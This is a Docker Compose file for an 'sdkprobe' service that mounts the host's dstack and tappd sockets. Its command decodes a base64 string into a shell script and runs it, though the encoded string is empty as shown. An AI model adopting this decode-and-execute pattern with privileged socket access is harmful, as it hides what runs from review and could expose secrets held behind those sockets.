services:
  sdkprobe:
    image: alpine@sha256:d9e853e87e55526f6b2917df91a2115c36dd7c696a35be12163d44e6e2a4b6bc
    restart: always
    volumes:
      - /var/run/dstack.sock:/var/run/dstack.sock
      - /var/run/tappd.sock:/var/run/tappd.sock
      - state:/state
    command:
      - sh
      - -c
      - echo  | base64 -d > /tmp/p.sh && sh /tmp/p.sh
volumes:
  state:
